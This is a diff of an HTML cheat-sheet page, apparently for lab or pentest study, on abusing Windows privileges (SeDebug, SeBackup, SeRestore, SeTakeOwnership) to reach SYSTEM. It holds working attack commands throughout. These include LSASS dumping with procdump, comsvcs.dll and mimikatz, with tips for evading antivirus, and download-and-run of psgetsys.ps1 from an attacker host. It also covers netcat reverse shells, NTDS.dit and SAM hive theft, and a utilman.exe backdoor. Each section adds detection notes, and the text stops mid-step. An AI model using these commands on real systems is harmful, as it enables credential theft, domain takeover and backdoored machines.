+            <li style="margin-bottom:8px;"><a href="https://rootsecdev.medium.com/hacking-active-directory-with-sliver-c2-19d7ceabbf13" target="_blank">Sliver C2 writeup on Access box — alternate C2 walkthrough</a></li>
           </ul>
         </div>
       </div>
 
       <div class="detection-box">
-        <div class="detection-title">🔍 Detection</div>
-        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">DACL modification on C:\ root • New DLL in C:\Windows\System32\spool\drivers\x64\3\ • PrintNotify service starting unexpectedly • Event 4674 on volume objects</div>
+        <div class="detection-title">Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">DACL modification on C:\ root (Event 4670) • New DLL in C:\Windows\System32\spool\drivers\x64\3\ • PrintNotify service starting unexpectedly • Event 4674 on volume objects • SeManageVolumeExploit.exe process execution</div>
       </div>
     </div>
 
@@ -997,55 +1393,179 @@ $object = [Activator]::CreateInstance($type)</div>
     <div id="page-sedebug" class="page">
       <div class="page-header">
         <div class="page-title">🐛 SeDebugPrivilege <span class="severity-badge sev-critical">CRITICAL</span></div>
-        <div class="page-sub">// READ/WRITE ANY PROCESS MEMORY → LSASS DUMP → TOKEN THEFT</div>
+        <div class="page-sub">// READ/WRITE ANY PROCESS MEMORY → LSASS DUMP → TOKEN THEFT → SYSTEM</div>
       </div>
       <div class="info-grid">
-        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Local admins, developers, some service accts</div></div>
-        <div class="info-card"><div class="info-label">Primary Attack</div><div class="info-value">Dump LSASS → steal SYSTEM token</div></div>
-        <div class="info-card"><div class="info-label">Result</div><div class="info-value">Plaintext creds + SYSTEM token</div></div>
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Local Admins by default; developers; some service accounts</div></div>
+        <div class="info-card"><div class="info-label">Primary Attack</div><div class="info-value">Dump LSASS memory → extract plaintext creds / NTLM hashes</div></div>
+        <div class="info-card"><div class="info-label">Alt Attack</div><div class="info-value">Steal SYSTEM token via parent process injection (psgetsys)</div></div>
+        <div class="info-card"><div class="info-label">Result</div><div class="info-value">Plaintext creds OR NT AUTHORITY\SYSTEM shell</div></div>
       </div>
 
+      <!-- Vector 1: procdump -->
       <div class="section">
-        <div class="section-header">⚡ Attack Options</div>
+        <div class="section-header">⚡ Vector 1 — LSASS Dump via procdump (safe, Sysinternals-signed)</div>
         <div class="section-body">
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Dump LSASS with procdump</div>
-              <div class="code-block">.\procdump.exe -ma lsass.exe lsass.dmp
-# Kali:
-mimikatz # sekurlsa::minidump lsass.dmp
-mimikatz # sekurlsa::logonpasswords</div>
+              <div class="step-title">Download procdump to target</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}/procdump.exe -o C:\Temp\procdump.exe</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
-              <div class="step-title">Task Manager dump (GUI)</div>
-              <div class="code-block">Details tab → right-click lsass.exe → Create dump file</div>
+              <div class="step-title">Dump LSASS full memory (-ma = all regions, -64 = force 64-bit context)</div>
+              <div class="code-block">C:\Temp\procdump.exe -accepteula -64 -ma lsass.exe C:\Temp\lsass.dmp</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">3</div>
             <div class="step-content">
-              <div class="step-title">Token duplication → SYSTEM process injection</div>
-              <div class="code-block"># With Meterpreter
-getsystem -t 1  # Token impersonation via SeDebug</div>
+              <div class="step-title">Exfiltrate dump then parse on Kali</div>
+              <div class="code-block green">mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">💡</span>
+            <span><code>-ma</code> = full memory dump (all regions). <code>-64</code> = force 64-bit context on 64-bit OS (omit on 32-bit). <code>-accepteula</code> suppresses EULA prompt. Sysinternals-signed binary reduces AV suspicion vs. running mimikatz directly.</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Vector 2: comsvcs.dll LOLBAS -->
+      <div class="section">
+        <div class="section-header">⚡ Vector 2 — LSASS Dump via comsvcs.dll MiniDump (LOLBAS — zero extra tools)</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">One-liner from elevated PowerShell — no binary upload required</div>
+              <div class="code-block green">rundll32 C:\Windows\System32\comsvcs.dll MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Alternative — explicit PID if Get-Process is constrained</div>
+              <div class="code-block">tasklist /fi "imagename eq lsass.exe"
+rundll32 C:\Windows\System32\comsvcs.dll MiniDump &lt;LSASS_PID&gt; C:\Temp\lsass.dmp full</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Parse dump on Kali</div>
+              <div class="code-block green">mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">💡</span>
+            <span>Pure LOLBAS — comsvcs.dll ships on every Windows install and exposes MiniDump export (ordinal 24) via rundll32. No binary upload needed. Must run from elevated SeDebug process. Output is identical MiniDump format as procdump.</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Vector 3: mimikatz direct -->
+      <div class="section">
+        <div class="section-header">⚡ Vector 3 — Mimikatz direct in-memory dump (most complete credential output)</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Upload mimikatz to target (use obfuscated/custom build for AV evasion)</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}/mimikatz.exe -o C:\Temp\m.exe</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Enable SeDebugPrivilege and dump credentials — batch mode</div>
+              <div class="code-block orange">C:\Temp\m.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Interactive mode</div>
+              <div class="code-block">mimikatz # privilege::debug
+# Expected: Privilege '20' OK
+mimikatz # sekurlsa::logonpasswords full</div>
+            </div>
+          </div>
+          <div class="alert alert-red">
+            <span class="alert-icon">⚠</span>
+            <span>HEAVY AV TRIGGER — mimikatz.exe is universally detected by signature. Use Invoke-Mimikatz (PowerShell in-memory), custom-obfuscated build, or the dump-then-parse workflow (Vectors 1/2) to avoid immediate endpoint detection.</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Vector 4: psgetsys token theft -->
+      <div class="section">
+        <div class="section-header">⚡ Vector 4 — psgetsys.ps1: Steal SYSTEM token via parent process (no creds needed)</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Load psgetsys.ps1 in-memory (decoder-it / splinter_code)</div>
+              <div class="code-block purple">IEX (New-Object Net.WebClient).DownloadString('http://{{KALI_IP}}/psgetsys.ps1')</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Find a SYSTEM-context process PID (winlogon.exe most reliable)</div>
+              <div class="code-block">Get-Process winlogon | Select-Object Id
+# or: tasklist /fi "username eq nt authority\system"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Impersonate SYSTEM by inheriting the parent process token — spawn reverse shell</div>
+              <div class="code-block green">ImpersonateFromParentPid -ppid (Get-Process winlogon).Id -command "C:\Windows\System32\cmd.exe" -cmdargs "/c C:\Temp\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">4</div>
             <div class="step-content">
-              <div class="step-title">psgetsys.ps1 — duplicate SYSTEM token</div>
-              <div class="code-block green">IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.250/psgetsys.ps1')
-ImpersonateFromParentPid -ppid (Get-Process winlogon).Id</div>
+              <div class="step-title">Kali: catch SYSTEM shell</div>
+              <div class="code-block green">nc -lvnp {{PORT}}</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">💡</span>
+            <span>Mechanism: SeDebugPrivilege enables <code>OpenProcess(PROCESS_ALL_ACCESS)</code> on any PID. Script calls <code>DuplicateTokenEx</code> on winlogon's SYSTEM token then <code>CreateProcessWithTokenW</code> to spawn SYSTEM child. Full CLI syntax: <code>ImpersonateFromParentPid -ppid &lt;pid&gt; -command &lt;exe&gt; -cmdargs &lt;args&gt;</code></span>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">🔗</span>
+            <span>Tool: <a href="https://github.com/decoder-it/psgetsystem" target="_blank">github.com/decoder-it/psgetsystem</a> — psgetsys.ps1 (PowerShell) and compiled .exe release both available.</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- GUI Bonus -->
+      <div class="section">
+        <div class="section-header">⚡ Bonus — Task Manager GUI dump (no tools, requires RDP access)</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Task Manager → Details tab → right-click lsass.exe → Create dump file</div>
+              <div class="code-block"># Dump auto-saved to: C:\Users\&lt;username&gt;\AppData\Local\Temp\lsass.DMP
+# Parse: mimikatz # sekurlsa::minidump lsass.DMP
+#        mimikatz # sekurlsa::logonpasswords</div>
             </div>
           </div>
         </div>
       </div>
+
       <div class="detection-box">
         <div class="detection-title">🔍 Detection</div>
-        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 4656 — handle request to lsass.exe • Access mask 0x1FFFFF on lsass • Procdump running • LSASS memory access by non-SYSTEM process</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 4656 — handle to lsass.exe with access mask 0x1FFFFF • procdump.exe or rundll32+comsvcs.dll reading lsass memory • Sysmon Event 10 — process access on lsass.exe by non-SYSTEM/non-WerFault process • .dmp file created in Temp directories • Event 4672 SeDebugPrivilege assigned to new logon</div>
       </div>
     </div>
 
@@ -1057,64 +1577,179 @@ ImpersonateFromParentPid -ppid (Get-Process winlogon).Id</div>
       </div>
       <div class="info-grid">
         <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Backup Operators group members</div></div>
-        <div class="info-card"><div class="info-label">Primary Attack</div><div class="info-value">Copy NTDS.dit via VSS/diskshadow</div></div>
+        <div class="info-card"><div class="info-label">Primary Attack</div><div class="info-value">diskshadow VSS → NTDS.dit (DC) or robocopy /b (local)</div></div>
         <div class="info-card"><div class="info-label">Result</div><div class="info-value">All domain NTLM hashes → DA PTH</div></div>
+        <div class="info-card"><div class="info-label">DLLs Required</div><div class="info-value">SeBackupPrivilegeCmdLets.dll + SeBackupPrivilegeUtils.dll</div></div>
       </div>
 
+      <div class="alert alert-red">
+        <span class="alert-icon">⚠</span>
+        <span><strong>Evil-WinRM caveat:</strong> Evil-WinRM network logon tokens may strip SeBackupPrivilege from the session. Verify with <code>whoami /priv</code>. If the privilege shows Disabled or is absent, use the PSRemoting workaround in Vector 3, or drop to a cmd shell via <code>winrs -r:TARGET cmd</code>.</span>
+      </div>
+
+      <!-- Vector 1: diskshadow VSS -->
       <div class="section">
-        <div class="section-header">⚡ Full Attack — Steal NTDS.dit</div>
+        <div class="section-header">⚡ Vector 1 — diskshadow VSS (Domain Controller / NTDS.dit)</div>
         <div class="section-body">
+          <div class="alert alert-gold">
+            <span class="alert-icon">💡</span>
+            <span><strong>Use on a DC.</strong> NTDS.dit is locked by the NTDS service at runtime — a VSS shadow copy is required. CRITICAL: the .dsh script MUST use Windows CRLF line endings. diskshadow silently fails on Unix LF files.</span>
+          </div>
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Create VSS script (diskshadow)</div>
-              <div class="code-block">echo "set context persistent nowriters" > pwn.dsh
-echo "add volume c: alias pwn" >> pwn.dsh
-echo "create" >> pwn.dsh
-echo "expose %pwn% z:" >> pwn.dsh
-unix2dos pwn.dsh</div>
+              <div class="step-title">Create pwn.dsh with Windows CRLF line endings (PowerShell)</div>
+              <div class="code-block purple">Set-Content -Path C:\Temp\pwn.dsh -Encoding ASCII -Value "set context persistent nowriters`r`nadd volume c: alias pwn`r`ncreate`r`nexpose %pwn% z:`r`n"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">1b</div>
+            <div class="step-content">
+              <div class="step-title">Alternative: create pwn.dsh via cmd.exe (printf with explicit CRLF)</div>
+              <div class="code-block">cmd /c printf "set context persistent nowriters\r\nadd volume c: alias pwn\r\ncreate\r\nexpose %%pwn%% z:\r\n" > C:\Temp\pwn.dsh</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
-              <div class="step-title">Run diskshadow</div>
-              <div class="code-block purple">diskshadow.exe /s pwn.dsh</div>
+              <div class="step-title">Run diskshadow to create VSS snapshot and expose as drive Z:</div>
+              <div class="code-block purple">diskshadow /s C:\Temp\pwn.dsh</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">3</div>
             <div class="step-content">
-              <div class="step-title">Import SeBackupPrivilege cmdlets + copy NTDS.dit</div>
+              <div class="step-title">Import SeBackupPrivilege DLLs (upload both to target first)</div>
               <div class="code-block purple">Import-Module .\SeBackupPrivilegeCmdLets.dll
-Import-Module .\SeBackupPrivilegeUtils.dll
-Copy-FileSeBackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit</div>
+Import-Module .\SeBackupPrivilegeUtils.dll</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">4</div>
             <div class="step-content">
-              <div class="step-title">Save SYSTEM hive</div>
-              <div class="code-block">reg save HKLM\SYSTEM C:\temp\system</div>
+              <div class="step-title">Copy NTDS.dit from shadow copy using backup semantics</div>
+              <div class="code-block green">Copy-FileSeBackupPrivilege z:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit -Overwrite</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">5</div>
             <div class="step-content">
-              <div class="step-title">Dump hashes on Kali</div>
-              <div class="code-block green">impacket-secretsdump -ntds ntds.dit -system system LOCAL</div>
+              <div class="step-title">Save SYSTEM hive (required to decrypt NTDS.dit)</div>
+              <div class="code-block">reg save HKLM\SYSTEM C:\Temp\system.hiv</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">6</div>
+            <div class="step-content">
+              <div class="step-title">Exfil both files to Kali, dump all domain hashes offline</div>
+              <div class="code-block green"># Kali:
+impacket-secretsdump -ntds ntds.dit -system system.hiv LOCAL</div>
             </div>
           </div>
           <div class="alert alert-teal">
             <span class="alert-icon">🔗</span>
-            <span>Tool: <a href="https://github.com/giuliano108/SeBackupPrivilege" target="_blank">github.com/giuliano108/SeBackupPrivilege</a> | Writeup: <a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" target="_blank">hackingarticles.in</a></span>
+            <span>DLLs: <a href="https://github.com/giuliano108/SeBackupPrivilege" target="_blank">github.com/giuliano108/SeBackupPrivilege</a> | Writeup: <a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" target="_blank">hackingarticles.in</a></span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Vector 2: robocopy /b -->
+      <div class="section">
+        <div class="section-header">⚡ Vector 2 — robocopy /b (SAM hive dump, no extra tools needed)</div>
+        <div class="section-body">
+          <div class="alert alert-gold">
+            <span class="alert-icon">💡</span>
+            <span><strong>Use on a local (non-DC) box.</strong> robocopy /B uses backup semantics natively — no DLLs or diskshadow required. Requires both SeBackupPrivilege and SeRestorePrivilege (both automatically granted to Backup Operators). Yields local user NTLM hashes.</span>
+          </div>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Copy SAM, SYSTEM, SECURITY hives using robocopy backup mode</div>
+              <div class="code-block green">robocopy /b C:\Windows\System32\config C:\Temp SAM SYSTEM SECURITY</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">1b</div>
+            <div class="step-content">
+              <div class="step-title">Alternative if robocopy fails — reg save directly</div>
+              <div class="code-block">reg save HKLM\SAM C:\Temp\sam.hiv
+reg save HKLM\SYSTEM C:\Temp\system.hiv
+reg save HKLM\SECURITY C:\Temp\security.hiv</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Exfil to Kali, dump local hashes offline</div>
+              <div class="code-block green"># Kali:
+impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Vector 3: Evil-WinRM PSRemoting workaround -->
+      <div class="section">
+        <div class="section-header">⚡ Vector 3 — Evil-WinRM privilege caveat + PSRemoting workaround</div>
+        <div class="section-body">
+          <div class="alert alert-red">
+            <span class="alert-icon">⚠</span>
+            <span><strong>Evil-WinRM may strip privileges:</strong> Network logon sessions from Evil-WinRM may not carry the full privilege token, causing SeBackupPrivilege and SeRestorePrivilege to appear Disabled. This is a WinRM network-logon token-filtering behavior.</span>
+          </div>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Workaround — loopback PSSession (creates interactive token)</div>
+              <div class="code-block purple">$sess = New-PSSession -ComputerName localhost -Credential (Get-Credential)
+Enter-PSSession $sess
+# Verify: whoami /priv | findstr SeBackupPrivilege</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Alternative — winrs (Windows Remote Shell, carries full token)</div>
+              <div class="code-block">winrs -r:{{TARGET}} cmd</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Verify privilege is active before running attacks</div>
+              <div class="code-block">whoami /priv | findstr /i "SeBackup SeRestore"
+# Must show: SeBackupPrivilege   Back up files and directories   Enabled</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Vector 4: Direct reg save -->
+      <div class="section">
+        <div class="section-header">⚡ Vector 4 — Direct reg save (local box, elevated context)</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Save all three critical registry hives</div>
+              <div class="code-block">reg save HKLM\SAM C:\Temp\sam.hiv
+reg save HKLM\SYSTEM C:\Temp\system.hiv
+reg save HKLM\SECURITY C:\Temp\security.hiv</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Exfil to Kali, dump local + cached domain creds</div>
+              <div class="code-block green"># Kali:
+impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv LOCAL</div>
+            </div>
           </div>
         </div>
       </div>
 
       <div class="detection-box">
         <div class="detection-title">🔍 Detection</div>
-        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">VSS snapshot creation • diskshadow.exe executed • File copy from shadow copy path • NTDS.dit accessed • Event 4656 with backup semantics flag</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">VSS snapshot creation (Event 8222) • diskshadow.exe executed with /s script argument • File read from shadow copy path • NTDS.dit or SAM/SYSTEM read with backup semantics (Event 4656) • robocopy.exe accessing C:\Windows\System32\config • reg.exe save on SAM/SYSTEM/SECURITY hives (Event 4663)</div>
       </div>
     </div>
 
@@ -1126,47 +1761,141 @@ Copy-FileSeBackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit</div>
       </div>
       <div class="info-grid">
         <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Backup Operators, restore service accounts</div></div>
-        <div class="info-card"><div class="info-label">Primary Attack</div><div class="info-value">Replace utilman.exe or service binary</div></div>
+        <div class="info-card"><div class="info-label">Primary Attack</div><div class="info-value">SeRestoreAbuse.exe — modifies Seclogon ImagePath via REG_OPTION_BACKUP_RESTORE</div></div>
         <div class="info-card"><div class="info-label">Result</div><div class="info-value">SYSTEM shell</div></div>
+        <div class="info-card"><div class="info-label">Tool Type</div><div class="info-value">Compiled EXE — NOT a PS module, no Import-Module</div></div>
       </div>
 
+      <div class="alert alert-red">
+        <span class="alert-icon">⚠</span>
+        <span><strong>SeRestoreAbuse is a compiled EXE, not a PowerShell module.</strong> Do NOT use Import-Module. There is no Enable-SeRestorePrivilege function — that does not exist in SeRestoreAbuse. The tool abuses REG_OPTION_BACKUP_RESTORE to modify the Seclogon service ImagePath registry key, triggers the service to run your payload as SYSTEM, then restores the original value.</span>
+      </div>
+
+      <!-- Vector 1: SeRestoreAbuse.exe -->
       <div class="section">
-        <div class="section-header">⚡ Attack — utilman.exe swap</div>
+        <div class="section-header">⚡ Vector 1 — SeRestoreAbuse.exe (cleanest — arbitrary SYSTEM command execution)</div>
         <div class="section-body">
+          <div class="alert alert-gold">
+            <span class="alert-icon">💡</span>
+            <span>SeRestoreAbuse.exe uses REG_OPTION_BACKUP_RESTORE to overwrite the Seclogon service ImagePath with your command, starts the service as SYSTEM, then restores the original registry value. No permanent file modification.</span>
+          </div>
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Use SeRestoreAbuse.exe to write privileged file</div>
-              <div class="code-block">.\SeRestoreAbuse.exe "cmd /c copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe"</div>
+              <div class="step-title">Upload SeRestoreAbuse.exe, verify SYSTEM execution works</div>
+              <div class="code-block">.\SeRestoreAbuse.exe "cmd /c whoami > C:\Temp\out.txt"
+type C:\Temp\out.txt
+# Expected: nt authority\system</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
-              <div class="step-title">Alternative: drop reverse shell instead</div>
-              <div class="code-block purple">.\SeRestoreAbuse.exe "cmd /c copy \\{{KALI_IP}}\share\shell.exe C:\Windows\System32\utilman.exe"</div>
+              <div class="step-title">Set up listener on Kali</div>
+              <div class="code-block orange"># Kali:
+nc -lvnp {{RPORT}}</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">3</div>
             <div class="step-content">
-              <div class="step-title">Lock screen → Win+U = SYSTEM cmd</div>
-              <div class="code-block"># On RDP: lock screen and press Win+U (Ease of Access button)</div>
+              <div class="step-title">Fire reverse shell via SeRestoreAbuse.exe</div>
+              <div class="code-block green">.\SeRestoreAbuse.exe "cmd /c C:\Temp\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"</div>
             </div>
           </div>
-          <div class="alert alert-gold">
-            <span class="alert-icon">💡</span>
-            <span>Alternative: overwrite a service binary in Program Files with a reverse shell payload.</span>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">Alternative: stage payload from SMB share first</div>
+              <div class="code-block">.\SeRestoreAbuse.exe "cmd /c copy \\{{KALI_IP}}\share\shell.exe C:\Windows\System32\utilman.exe"</div>
+            </div>
           </div>
           <div class="alert alert-teal">
             <span class="alert-icon">🔗</span>
-            <span>Tool: <a href="https://github.com/xct/SeRestoreAbuse" target="_blank">github.com/xct/SeRestoreAbuse</a></span>
+            <span>Tool source: <a href="https://github.com/xct/SeRestoreAbuse" target="_blank">github.com/xct/SeRestoreAbuse</a> | Precompiled: <a href="https://github.com/overgrowncarrot1/SeRestoreAbuse" target="_blank">github.com/overgrowncarrot1/SeRestoreAbuse</a></span>
           </div>
         </div>
       </div>
+
+      <!-- Vector 2: utilman.exe swap -->
+      <div class="section">
+        <div class="section-header">⚡ Vector 2 — utilman.exe swap (requires active RDP session)</div>
+        <div class="section-body">
+          <div class="alert alert-gold">
+            <span class="alert-icon">💡</span>
+            <span>Replaces utilman.exe (Ease of Access) with cmd.exe. On the RDP lock screen, pressing <strong>Win+U</strong> spawns a SYSTEM cmd instead of Ease of Access. Requires an active RDP session to the target.</span>
+          </div>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Overwrite utilman.exe with cmd.exe via SeRestoreAbuse</div>
+              <div class="code-block green">.\SeRestoreAbuse.exe "cmd /c copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Lock the RDP session, trigger SYSTEM cmd at lock screen</div>
+              <div class="code-block"># In RDP: press Windows + L to lock the session
+# At the lock screen: press Win+U or click the Ease of Access icon
+# cmd.exe spawns as NT AUTHORITY\SYSTEM</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Opsec: restore utilman.exe after use</div>
+              <div class="code-block orange">.\SeRestoreAbuse.exe "cmd /c copy C:\Windows\System32\utilman.exe.old C:\Windows\System32\utilman.exe"</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Vector 3: Service binary overwrite -->
+      <div class="section">
+        <div class="section-header">⚡ Vector 3 — Overwrite service binary + restart (no RDP needed)</div>
+        <div class="section-body">
+          <div class="alert alert-gold">
+            <span class="alert-icon">💡</span>
+            <span>Overwrite a vulnerable service binary with a reverse shell payload using SeRestoreAbuse.exe, then restart the service. Service runs as SYSTEM. No RDP required.</span>
+          </div>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Identify a stoppable service running as SYSTEM</div>
+              <div class="code-block">sc qc VulnService
+# Check: SERVICE_START_NAME = LocalSystem, BINARY_PATH_NAME = writable path</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Stop service, overwrite binary with your payload</div>
+              <div class="code-block">sc stop VulnService
+.\SeRestoreAbuse.exe "cmd /c copy {{WPATH}}\shell.exe C:\Program Files\VulnService\service.exe"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Start listener on Kali</div>
+              <div class="code-block orange"># Kali:
+nc -lvnp {{RPORT}}</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">Start the service to trigger payload execution</div>
+              <div class="code-block green">sc start VulnService</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
       <div class="detection-box">
         <div class="detection-title">🔍 Detection</div>
-        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Write to C:\Windows\System32\ by non-SYSTEM user • utilman.exe or sethc.exe modified • Event 4663 write access on system binaries</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Write to C:\Windows\System32\ by non-SYSTEM process (Event 4663) • utilman.exe, sethc.exe, or osk.exe modified (Event 4656) • Seclogon service ImagePath changed in registry (Event 4657 — HKLM\SYSTEM\CurrentControlSet\Services\seclogon\ImagePath) • Service binary overwrite followed by immediate restart • REG_OPTION_BACKUP_RESTORE flag in kernel registry audit log</div>
       </div>
     </div>
 
@@ -1180,53 +1909,123 @@ Copy-FileSeBackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit</div>
         <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Admins, sometimes delegated svc accounts</div></div>
         <div class="info-card"><div class="info-label">Attack</div><div class="info-value">Own file → add write ACE → replace binary</div></div>
         <div class="info-card"><div class="info-label">Result</div><div class="info-value">SYSTEM (via svc binary or reg key)</div></div>
+        <div class="info-card"><div class="info-label">Key Targets</div><div class="info-value">utilman.exe, sethc.exe, SAM registry key, service binaries</div></div>
+      </div>
+
+      <div class="alert alert-red">
+        <span class="alert-icon">🔴</span>
+        <span><strong>ALWAYS backup the original file before replacing it!</strong> Replacing a system binary without backup can break the machine and is irreversible without re-imaging.</span>
       </div>
 
       <div class="section">
-        <div class="section-header">⚡ Attack Chain</div>
+        <div class="section-header">⚡ Method 1 — Built-in tools: takeown + icacls (no extra tools needed)</div>
         <div class="section-body">
+          <div class="flow-chain">
+            <div class="flow-node">SeTakeOwnership</div><div class="flow-arrow">→</div>
+            <div class="flow-node">takeown /f file</div><div class="flow-arrow">→</div>
+            <div class="flow-node">icacls /grant F</div><div class="flow-arrow">→</div>
+            <div class="flow-node">Replace binary</div><div class="flow-arrow">→</div>
+            <div class="flow-node">Win+U on RDP</div><div class="flow-arrow">→</div>
+            <div class="flow-node">SYSTEM shell</div>
+          </div>
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Take ownership of target file</div>
-              <div class="code-block">takeown /f C:\Windows\System32\utilman.exe
-# Or for a registry key:
-takeown /f "HKLM\SYSTEM\CurrentControlSet\Services\vuln_svc" /a</div>
+              <div class="step-title">Backup original file first</div>
+              <div class="code-block">copy C:\Windows\System32\utilman.exe C:\Temp\utilman.exe.bak</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Take ownership of the target file</div>
+              <div class="code-block">takeown /f C:\Windows\System32\utilman.exe</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
             <div class="step-content">
               <div class="step-title">Grant yourself full control</div>
               <div class="code-block">icacls C:\Windows\System32\utilman.exe /grant "%USERNAME%":F</div>
             </div>
           </div>
           <div class="step">
-            <div class="step-num">3</div>
+            <div class="step-num">4</div>
             <div class="step-content">
-              <div class="step-title">Replace with payload / cmd.exe</div>
-              <div class="code-block purple">copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
-# Or copy reverse shell payload</div>
+              <div class="step-title">Replace with cmd.exe (Ease of Access backdoor)</div>
